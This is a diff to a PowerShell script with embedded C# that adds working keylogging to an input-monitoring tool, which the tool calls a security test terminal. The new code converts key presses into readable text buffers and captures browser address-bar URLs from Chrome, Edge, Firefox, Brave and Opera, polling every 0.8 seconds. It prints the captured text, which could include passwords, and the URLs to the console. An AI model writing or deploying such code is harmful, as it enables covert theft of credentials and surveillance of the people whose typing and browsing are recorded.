@@ -14,6 +14,7 @@ $code = @"
 using System;
 using System.Text;
 using System.Runtime.InteropServices;
+using System.Windows.Automation;
 
 public class $className {
     [StructLayout(LayoutKind.Sequential)]
@@ -61,6 +62,18 @@ public class $className {
     [DllImport("user32.dll")]
     public static extern uint GetClipboardSequenceNumber();
 
+    [DllImport("user32.dll")]
+    public static extern int ToUnicode(
+        uint wVirtKey,
+        uint wScanCode,
+        byte[] lpKeyState,
+        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
+        int cchBuff,
+        uint wFlags);
+
+    [DllImport("user32.dll")]
+    public static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
     // 抓取滑鼠座標並對 X(鮮綠色) 與 Y(鮮紅色) 進行高亮渲染
     public static string GetMousePosStringColored(string greenEsc, string redEsc, string resetEsc) {
         POINT pt;
@@ -101,11 +114,54 @@ public class $className {
 
         return "";
     }
+
+    // 將虛擬按鍵 (VK) 轉為實際字元
+    public static string VkToChar(uint vk, byte[] keyState) {
+        try {
+            StringBuilder sb = new StringBuilder(16);
+            uint scanCode = MapVirtualKey(vk, 0);
+            int result = ToUnicode(vk, scanCode, keyState, sb, sb.Capacity, 0);
+            if (result > 0) {
+                return sb.ToString();
+            }
+        } catch {}
+        return null;
+    }
+
+    // 使用 UI Automation 擷取瀏覽器網址列 (Chrome, Edge, Firefox, Brave, Opera)
+    public static string GetBrowserUrl(IntPtr hwnd, string processName) {
+        if (hwnd == IntPtr.Zero) return null;
+        string proc = processName.ToLower();
+        if (!proc.Contains("chrome") && !proc.Contains("msedge") && !proc.Contains("firefox") && !proc.Contains("brave") && !proc.Contains("opera"))
+            return null;
+
+        try {
+            AutomationElement element = AutomationElement.FromHandle(hwnd);
+            if (element == null) return null;
+
+            Condition cond = new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit);
+            AutomationElementCollection edits = element.FindAll(TreeScope.Descendants, cond);
+
+            foreach (AutomationElement edit in edits) {
+                object valPattern;
+                if (edit.TryGetCurrentPattern(ValuePattern.Pattern, out valPattern)) {
+                    string url = ((ValuePattern)valPattern).Current.Value;
+                    if (!string.IsNullOrEmpty(url) && (url.Contains(".") || url.StartsWith("about:") || url.StartsWith("chrome:"))) {
+                        if (!url.StartsWith("http://") && !url.StartsWith("https://") && !url.StartsWith("file://") && !url.StartsWith("about:") && !url.StartsWith("chrome:")) {
+                            url = "https://" + url;
+                        }
+                        return url;
+                    }
+                }
+            }
+        } catch {}
+        return null;
+    }
 }
 "@
 
-# 強制過濾出主類別，防止 struct POINT 干擾
-$compiledTypes = Add-Type -TypeDefinition $code -PassThru
+# 引用 UI Automation 組件載入 C# 程式碼
+$compiledTypes = Add-Type -TypeDefinition $code -ReferencedAssemblies @("UIAutomationClient", "UIAutomationTypes") -PassThru
 $type = $compiledTypes | Where-Object { $_.Name -eq $className }
 
 # ANSI 色彩控制碼
@@ -280,6 +336,19 @@ function Get-CurrentLanguage {
     return "$langName$imeMode"
 }
 
+# 建立按鍵文字緩衝區
+$textBuffer = New-Object System.Text.StringBuilder
+
+function Flush-TextBuffer {
+    if ($textBuffer.Length -gt 0) {
+        $str = $textBuffer.ToString().Trim()
+        if ($str.Length -gt 0) {
+            Write-Host "$(Get-TimeStamp)📝 [輸入文字段落] -> `"$str`"" -ForegroundColor Yellow
+        }
+        $null = $textBuffer.Clear()
+    }
+}
+
 # 全域控制變數
 $modifierVKs = @(91, 92, 160, 161, 162, 163, 164, 165)
 $mouseVKs = @(1, 2, 4)
@@ -290,6 +359,8 @@ $startTime = [DateTime]::Now
 $lastLanguage = Get-CurrentLanguage
 $lastHwnd = [IntPtr]::Zero
 $lastClipSeq = $type::GetClipboardSequenceNumber()
+$lastUrl = ""
+$lastUrlCheckTime = [DateTime]::Now
 
 $comboActive = $false
 $comboChain = [System.Collections.Generic.List[psobject]]::new()
@@ -303,7 +374,7 @@ $lastSinglePressTime = $null
 $lastSinglePressPosStr = ""
 
 Write-Host "====================================================" -ForegroundColor Cyan
-Write-Host "  資安測試終端：鍵盤/滑鼠/組合鍵/剪貼簿/視窗監控" -ForegroundColor Cyan
+Write-Host "  資安測試終端：網址/文字段落/鍵盤/滑鼠/剪貼簿監控" -ForegroundColor Cyan
 Write-Host "====================================================" -ForegroundColor Cyan
 Write-Host ""
 if ($lastLanguage) {
@@ -314,31 +385,51 @@ while ($true) {
     if ($time -gt 0) {
         $elapsed = ([DateTime]::Now - $startTime).TotalSeconds
         if ($elapsed -ge $time) {
+            Flush-TextBuffer
             if ($comboActive) { Write-Host ""; $comboActive = $false }
             Write-Host "`n$(Get-TimeStamp)[系統] 已達到指定的監聽時間 ($time 秒)，程式結束。" -ForegroundColor Red
             break
         }
     }
 
-    # 1. 視窗切換監控
+    # 1. 視窗切換監控與瀏覽器網址擷取
     $winInfo = Get-FocusedWindowInfo
     if ($winInfo -and $winInfo.Hwnd -ne $lastHwnd) {
+        Flush-TextBuffer
         $lastHwnd = $winInfo.Hwnd
         if ($comboActive) { Write-Host ""; $comboActive = $false }
         $canErasePreviousSinglePress = $false
         Write-Host "$(Get-TimeStamp)$($winInfo.Formatted)" -ForegroundColor Cyan
+
+        # 切換視窗時偵測瀏覽器網址
+        $lastUrl = $type::GetBrowserUrl($winInfo.Hwnd, $winInfo.Process)
+        if ($lastUrl) {
+            Write-Host "$(Get-TimeStamp)🌐 [瀏覽器網址] -> $lastUrl" -ForegroundColor Green
+        }
     }
 
-    # 2. 語言與 IME 中/英切換偵測
+    # 2. 瀏覽器內部網址變更持續監控 (每 0.8 秒輪詢一次避免高 CPU)
+    if ($winInfo -and ([DateTime]::Now - $lastUrlCheckTime).TotalMilliseconds -gt 800) {
+        $lastUrlCheckTime = [DateTime]::Now
+        $currentUrl = $type::GetBrowserUrl($winInfo.Hwnd, $winInfo.Process)
+        if ($currentUrl -and $currentUrl -ne $lastUrl) {
+            $lastUrl = $currentUrl
+            if ($comboActive) { Write-Host ""; $comboActive = $false }
+            Write-Host "$(Get-TimeStamp)🌐 [網址變更] -> $currentUrl" -ForegroundColor Green
+        }
+    }
+
+    # 3. 語言與 IME 中/英切換偵測
     $currentLang = Get-CurrentLanguage
     if ($currentLang -and $currentLang -ne $lastLanguage) {
+        Flush-TextBuffer
         $lastLanguage = $currentLang
         if ($comboActive) { Write-Host ""; $comboActive = $false }
         $canErasePreviousSinglePress = $false
         Write-Host "$(Get-TimeStamp)🌐 [語言切換] -> $lastLanguage" -ForegroundColor Yellow
     }
 
-    # 3. 多格式剪貼簿變更偵測
+    # 4. 多格式剪貼簿變更偵測
     $currentClipSeq = $type::GetClipboardSequenceNumber()
     if ($currentClipSeq -ne $lastClipSeq) {
         $lastClipSeq = $currentClipSeq
@@ -364,7 +455,7 @@ while ($true) {
         }
     }
 
-    # 4. 高效能鍵盤與滑鼠按鍵掃描 (2ms 輪詢)
+    # 5. 高效能鍵盤與滑鼠按鍵掃描 (2ms 輪詢)
     $null = $type::GetKeyboardState($keyStateBuffer)
 
     for ($vk = 1; $vk -le 254; $vk++) {
@@ -382,6 +473,24 @@ while ($true) {
                 $kColor = Get-KeyColor $vk
                 $isMouse = $mouseVKs -contains $vk
                 $posStr = if ($isMouse) { " " + ($type::GetMousePosStringColored($cBrightGreen, $cBrightRed, $cReset)) } else { "" }
+
+                # --- 核心：按鍵緩衝區 (Text Buffer) 邏輯 ---
+                if (-not $isMouse) {
+                    if ($vk -eq 8) { # Backspace 刪除鍵
+                        if ($textBuffer.Length -gt 0) {
+                            $null = $textBuffer.Remove($textBuffer.Length - 1, 1)
+                        }
+                    } elseif ($vk -eq 13 -or $vk -eq 9 -or $vk -eq 27) { # Enter / Tab / ESC 觸發 Flush
+                        Flush-TextBuffer
+                    } elseif ($vk -eq 32) { # Space 空格鍵
+                        $null = $textBuffer.Append(" ")
+                    } elseif ($vk -ge 32 -and $vk -ne 91 -and $vk -ne 92) { # 一般可列印字元 (字母/數字/符號)
+                        $ch = $type::VkToChar($vk, $keyStateBuffer)
+                        if ($ch -and $ch.Length -gt 0 -and [int][char]$ch[0] -ge 32) {
+                            $null = $textBuffer.Append($ch)
+                        }
+                    }
+                }
 
                 $activeModsCount = 0
                 foreach ($mvk in $modifierVKs) {
